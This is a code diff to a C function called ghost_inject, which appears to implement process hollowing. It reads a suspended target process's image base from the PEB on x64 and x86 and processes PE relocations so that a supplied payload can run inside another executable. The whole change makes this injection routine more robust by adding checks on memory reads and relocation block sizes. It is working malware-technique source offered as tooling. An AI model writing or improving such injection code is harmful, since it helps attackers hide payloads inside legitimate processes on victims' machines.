@@ -35,11 +35,19 @@ BOOL ghost_inject(LPCSTR targetExe, PBYTE payload, DWORD payloadSize) {
     // On x64: PEB at ctx.Rdx, ImageBaseAddress at PEB+0x10
     PVOID pImageBase = NULL;
 #ifdef _WIN64
-    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
-                      &pImageBase, sizeof(PVOID), NULL);
+    if (!ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
+                      &pImageBase, sizeof(PVOID), NULL)) {
+        printf("[!] ghost_inject: Failed to read image base\n");
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
 #else
-    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
-                      &pImageBase, sizeof(PVOID), NULL);
+    if (!ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
+                      &pImageBase, sizeof(PVOID), NULL)) {
+        printf("[!] ghost_inject: Failed to read image base\n");
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
 #endif
     printf("[*] ghost_inject: Target image base: %p\n", pImageBase);
 
@@ -106,6 +114,10 @@ BOOL ghost_inject(LPCSTR targetExe, PBYTE payload, DWORD payloadSize) {
         PBYTE relocEnd = (PBYTE)pReloc + relocSize;
 
         while ((PBYTE)pReloc < relocEnd && pReloc->SizeOfBlock) {
+          if (pReloc->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
+              printf("[!] ghost_inject: Invalid relocation block size\n");
+              break;
+          }
           DWORD entryCount =
               (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
               sizeof(WORD);
